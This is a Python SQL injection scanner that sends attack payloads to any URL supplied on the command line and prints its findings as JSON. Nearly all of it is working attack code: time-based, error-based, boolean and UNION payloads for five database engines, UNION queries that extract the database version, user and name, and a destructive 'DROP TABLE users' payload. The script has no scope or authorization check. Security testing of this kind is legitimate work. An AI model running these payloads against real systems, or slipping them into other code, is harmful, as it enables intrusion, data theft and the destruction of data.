#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# sql_scanner.py - SQL injection vulnerability scanner

import sys
import json
import requests
import time
import re
import random
import argparse
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup

class AdvancedSQLiScanner:
    def __init__(self, target_url, custom_params=None):
        self.target_url = target_url
        self.custom_params = custom_params or []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = []
        
        # Database-specific error patterns
        self.db_errors = {
            'mysql': [
                r"mysql_fetch_array\(\)",
                r"you have an error in your sql syntax",
                r"mysql_num_rows\(\)",
                r"mysql_fetch_assoc\(\)",
                r"mysql_connect\(\)",
                r"Unknown column",
                r"mysql server version for the right syntax"
            ],
            'postgresql': [
                r"postgresql query failed",
                r"invalid input syntax",
                r"pg_query\(\)",
                r"pg_exec\(\)",
                r"unterminated quoted string"
            ],
            'mssql': [
                r"microsoft ole db provider for sql server",
                r"unclosed quotation mark after the character string",
                r"microsoft jet database engine",
                r"syntax error in string in query expression"
            ],
            'oracle': [
                r"ora-\d{5}",
                r"oracle error",
                r"oracle.*driver",
                r"warning.*oci_"
            ],
            'sqlite': [
                r"sqlite_query\(\)",
                r"sqlite error",
                r"no such table",
                r"sqlite3::prepare"
            ]
        }

    def detect_database_type(self, response_text):
        """Detect database type from error messages"""
        response_lower = response_text.lower()
        
        for db_type, patterns in self.db_errors.items():
            for pattern in patterns:
                if re.search(pattern, response_lower):
                    return db_type
        return 'unknown'

    def build_test_url(self, payload, param_name=None):
        """Build test URL with payload"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        # Use provided param_name or custom_params or existing params
        if param_name:
            base_url = self.target_url.split('?')[0]
            return f"{base_url}?{param_name}={payload}"
        elif self.custom_params:
            param_name = self.custom_params[0]
            base_url = self.target_url.split('?')[0]
            return f"{base_url}?{param_name}={payload}"
        elif params:
            param_name = list(params.keys())[0]
            base_url = self.target_url.split('?')[0]
            return f"{base_url}?{param_name}={payload}"
        else:
            # Use common parameter names
            common_params = ['id', 'user_id', 'product_id', 'page', 'category', 'item']
            param_name = random.choice(common_params)
            return f"{self.target_url}{'&' if '?' in self.target_url else '?'}{param_name}={payload}"

    def time_based_sqli_scan(self):
        """Time-based blind SQL injection scan"""
        time_payloads = {
            'mysql': [
                "1' AND SLEEP(5)-- ",
                "1\" AND SLEEP(5)-- ",
                "1 AND SLEEP(5)-- ",
                "1' AND (SELECT * FROM (SELECT SLEEP(5))x)-- "
            ],
            'postgresql': [
                "1' AND pg_sleep(5)-- ",
                "1\" AND pg_sleep(5)-- "
            ],
            'mssql': [
                "1'; WAITFOR DELAY '00:00:05'-- ",
                "1\"; WAITFOR DELAY '00:00:05'-- "
            ],
            'oracle': [
                "1' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)>0-- "
            ]
        }
        
        # Determine which parameters to test
        params_to_test = self.custom_params if self.custom_params else ['id']
        
        print(f"[INFO] Testing time-based SQL injection on params: {params_to_test}", file=sys.stderr)
        
        for param in params_to_test:
            for db_type, payloads in time_payloads.items():
                for payload in payloads:
                    try:
                        test_url = self.build_test_url(payload, param)
                        
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=10)
                        response_time = time.time() - start_time
                        
                        # Check if response time indicates vulnerability
                        vulnerable = response_time > 4.5
                        
                        if vulnerable:
                            severity = self.calculate_severity(response_time, 'time-based')
                            confidence = min(95, int((response_time / 5.0) * 100))
                        else:
                            severity = None
                            confidence = 0
                        
                        self.results.append({
                            'payload': payload,
                            'vulnerable': vulnerable,
                            'method': 'time-based',
                            'parameter': param,
                            'url': test_url,
                            'responseTime': int(response_time * 1000),
                            'databaseType': db_type,
                            'injectionType': 'time-blind',
                            'severity': severity,
                            'confidence': confidence,
                            'evidence': f"Response time: {response_time:.2f}s" if vulnerable else None,
                            'recommendation': "Use parameterized queries or prepared statements" if vulnerable else None
                        })
                        
                        # Avoid too frequent requests
                        time.sleep(1)
                        
                    except Exception as e:
                        self.results.append({
                            'payload': payload,
                            'vulnerable': False,
                            'method': 'time-based',
                            'parameter': param,
                            'error': str(e),
                            'databaseType': db_type
                        })

    def error_based_sqli_scan(self):
        """Error-based SQL injection scan"""
        error_payloads = [
            "'",
            "\"",
            "1'",
            "1\"",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "' UNION SELECT NULL-- ",
            "\" UNION SELECT NULL-- ",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- ",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
            "'; DROP TABLE users-- ",
            "\"; DROP TABLE users-- "
        ]
        
        params_to_test = self.custom_params if self.custom_params else ['id']
        
        print(f"[INFO] Testing error-based SQL injection on params: {params_to_test}", file=sys.stderr)
        
        for param in params_to_test:
            for payload in error_payloads:
                try:
                    test_url = self.build_test_url(payload, param)
                    response = self.session.get(test_url, timeout=8)
                    
                    db_type = self.detect_database_type(response.text)
                    vulnerable = db_type != 'unknown'
                    
                    if vulnerable:
                        severity = self.calculate_severity_by_payload(payload)
                        confidence = 90 if 'DROP TABLE' in payload else 80
                        error_evidence = self.extract_sql_error(response.text)
                    else:
                        severity = None
                        confidence = 0
                        error_evidence = None
                    
                    self.results.append({
                        'payload': payload,
                        'vulnerable': vulnerable,
                        'method': 'error-based',
                        'parameter': param,
                        'url': test_url,
                        'databaseType': db_type,
                        'injectionType': 'string' if "'" in payload else 'numeric',
                        'severity': severity,
                        'confidence': confidence,
                        'evidence': error_evidence,
                        'recommendation': "Use parameterized queries and filter special characters" if vulnerable else None
                    })
                    
                except Exception as e:
                    self.results.append({
                        'payload': payload,
                        'vulnerable': False,
                        'method': 'error-based',
                        'parameter': param,
                        'error': str(e)
                    })

    def boolean_based_sqli_scan(self):
        """Boolean-based blind SQL injection scan"""
        try:
            # Get normal response as baseline
            normal_response = self.session.get(self.target_url, timeout=5)
            normal_length = len(normal_response.text)
            normal_status = normal_response.status_code
            
            boolean_tests = [
                {
                    'true_payload': "1' AND '1'='1",
                    'false_payload': "1' AND '1'='2",
                    'description': 'String-based boolean injection'
                },
                {
                    'true_payload': "1 AND 1=1",
                    'false_payload': "1 AND 1=2", 
                    'description': 'Numeric-based boolean injection'
                },
                {
                    'true_payload': "1' OR '1'='1",
                    'false_payload': "1' AND '1'='2",
                    'description': 'OR-based boolean injection'
                }
            ]
            
            params_to_test = self.custom_params if self.custom_params else ['id']
            
            print(f"[INFO] Testing boolean-based SQL injection", file=sys.stderr)
            
            for param in params_to_test:
                for test in boolean_tests:
                    try:
                        # Test TRUE condition
                        true_url = self.build_test_url(test['true_payload'], param)
                        true_response = self.session.get(true_url, timeout=5)
                        
                        # Test FALSE condition
                        false_url = self.build_test_url(test['false_payload'], param)
                        false_response = self.session.get(false_url, timeout=5)
                        
                        # Compare responses
                        true_length = len(true_response.text)
                        false_length = len(false_response.text)
                        
                        length_diff = abs(true_length - false_length)
                        status_diff = true_response.status_code != false_response.status_code
                        
                        # Check if responses are different
                        vulnerable = length_diff > 100 or status_diff
                        
                        if vulnerable:
                            severity = 'medium' if length_diff > 500 else 'low'
                            confidence = min(85, int((length_diff / 1000) * 100) + 30)
                        else:
                            severity = None
                            confidence = 0
                        
                        self.results.append({
                            'payload': f"True: {test['true_payload']}, False: {test['false_payload']}",
                            'vulnerable': vulnerable,
                            'method': 'boolean-based',
                            'parameter': param,
                            'injectionType': 'blind',
                            'severity': severity,
                            'confidence': confidence,
                            'evidence': f"Length diff: {length_diff}, Status diff: {status_diff}" if vulnerable else None,
                            'recommendation': "Implement strict input validation and parameterized queries" if vulnerable else None
                        })
                        
                    except Exception as e:
                        self.results.append({
                            'payload': test['description'],
                            'vulnerable': False,
                            'method': 'boolean-based',
                            'parameter': param,
                            'error': str(e)
                        })
            
        except Exception as e:
            self.results.append({
                'payload': 'boolean-based-scan',
                'vulnerable': False,
                'method': 'boolean-based',
                'error': f"Base request failed: {str(e)}"
            })

    def union_based_sqli_scan(self):
        """UNION-based SQL injection scan"""
        params_to_test = self.custom_params if self.custom_params else ['id']
        
        print(f"[INFO] Testing UNION-based SQL injection", file=sys.stderr)
        
        for param in params_to_test:
            # First determine number of columns
            column_detection_payloads = [
                "1' ORDER BY 1-- ",
                "1' ORDER BY 2-- ",
                "1' ORDER BY 3-- ",
                "1' ORDER BY 4-- ",
                "1' ORDER BY 5-- ",
                "1' ORDER BY 10-- ",
                "1' ORDER BY 20-- "
            ]
            
            detected_columns = 0
            
            # Detect columns
            for i, payload in enumerate(column_detection_payloads, 1):
                try:
                    test_url = self.build_test_url(payload, param)
                    response = self.session.get(test_url, timeout=5)
                    
                    # If no error, columns count is at least this many
                    if not self.has_sql_error(response.text):
                        detected_columns = i
                    else:
                        break
                        
                except Exception:
                    break
            
            # UNION attack based on detected columns
            if detected_columns > 0:
                null_string = ','.join(['NULL'] * detected_columns)
                union_payloads = [
                    f"1' UNION SELECT {null_string}-- ",
                    f"1\" UNION SELECT {null_string}-- ",
                    f"-1' UNION SELECT {null_string}-- ",
                    f"1' UNION ALL SELECT {null_string}-- "
                ]
                
                # Try to extract database info
                if detected_columns > 0:
                    info_payloads = [
                        f"1' UNION SELECT version(),{','.join(['NULL'] * (detected_columns-1))}-- " if detected_columns > 0 else "",
                        f"1' UNION SELECT user(),{','.join(['NULL'] * (detected_columns-1))}-- " if detected_columns > 0 else "",
                        f"1' UNION SELECT database(),{','.join(['NULL'] * (detected_columns-1))}-- " if detected_columns > 0 else ""
                    ]
                    union_payloads.extend([p for p in info_payloads if p])
                
                for payload in union_payloads:
                    try:
                        test_url = self.build_test_url(payload, param)
                        response = self.session.get(test_url, timeout=5)
                        
                        # Check if UNION was successful
                        vulnerable = not self.has_sql_error(response.text) and len(response.text) > 0
                        
                        if vulnerable:
                            severity = 'high'  # UNION injection is usually high severity
                            confidence = 85
                            evidence = self.extract_union_data(response.text)
                        else:
                            severity = None
                            confidence = 0
                            evidence = None
                        
                        self.results.append({
                            'payload': payload,
                            'vulnerable': vulnerable,
                            'method': 'union-based',
                            'parameter': param,
                            'injectionType': 'union',
                            'severity': severity,
                            'confidence': confidence,
                            'evidence': evidence,
                            'recommendation': "Immediately fix SQL injection vulnerability and review all database queries" if vulnerable else None
                        })
                        
                    except Exception as e:
                        self.results.append({
                            'payload': payload,
                            'vulnerable': False,
                            'method': 'union-based',
                            'parameter': param,
                            'error': str(e)
                        })

    def has_sql_error(self, response_text):
        """Check if response contains SQL errors"""
        response_lower = response_text.lower()
        
        for db_type, patterns in self.db_errors.items():
            for pattern in patterns:
                if re.search(pattern, response_lower):
                    return True
        return False

    def extract_sql_error(self, response_text):
        """Extract SQL error message"""
        response_lower = response_text.lower()
        
        for db_type, patterns in self.db_errors.items():
            for pattern in patterns:
                match = re.search(pattern, response_lower)
                if match:
                    # Return error context
                    start = max(0, match.start() - 50)
                    end = min(len(response_text), match.end() + 50)
                    return response_text[start:end].strip()
        return None

    def extract_union_data(self, response_text):
        """Extract data from UNION query results"""
        patterns = [
            r'version\(\)[^<]*(\d+\.\d+\.\d+)',
            r'user\(\)[^<]*([a-zA-Z0-9@._-]+)',
            r'database\(\)[^<]*([a-zA-Z0-9_-]+)'
        ]
        
        extracted_data = []
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                extracted_data.append(match.group(1))
        
        return ', '.join(extracted_data) if extracted_data else None

    def calculate_severity(self, response_time, method):
        """Calculate severity based on response time"""
        if method == 'time-based':
            if response_time > 8:
                return 'critical'
            elif response_time > 6:
                return 'high'
            elif response_time > 4.5:
                return 'medium'
        return 'low'

    def calculate_severity_by_payload(self, payload):
        """Calculate severity based on payload"""
        if 'DROP TABLE' in payload.upper():
            return 'critical'
        elif 'UNION' in payload.upper():
            return 'high'
        elif any(x in payload for x in ["'", '"']):
            return 'medium'
        return 'low'

    def run_scan(self):
        """Run complete SQL injection scan"""
        try:
            print(f"[INFO] Starting SQL injection scan for: {self.target_url}", file=sys.stderr)
            
            if self.custom_params:
                print(f"[INFO] Using custom parameters: {self.custom_params}", file=sys.stderr)
            
            # 1. Error-based detection
            self.error_based_sqli_scan()
            
            # 2. Time-based blind detection
            self.time_based_sqli_scan()
            
            # 3. Boolean-based blind detection
            self.boolean_based_sqli_scan()
            
            # 4. UNION-based detection
            self.union_based_sqli_scan()
            
            print(f"[INFO] Scan completed. Total tests: {len(self.results)}", file=sys.stderr)
            
        except Exception as e:
            self.results.append({
                'payload': 'general_scan',
                'vulnerable': False,
                'error': f'General scan error: {str(e)}',
                'method': 'error'
            })
        
        return self.results

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Advanced SQL Injection Scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--params', 
                       help='Comma-separated list of parameters to test',
                       default='')
    
    args = parser.parse_args()
    
    # Process parameters
    custom_params = []
    if args.params:
        custom_params = [p.strip() for p in args.params.split(',') if p.strip()]
        print(f"[DEBUG] Received params from TypeScript: {custom_params}", file=sys.stderr)
    
    # Create scanner and run
    scanner = AdvancedSQLiScanner(args.url, custom_params)
    results = scanner.run_scan()
    
    # Output JSON results
    print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()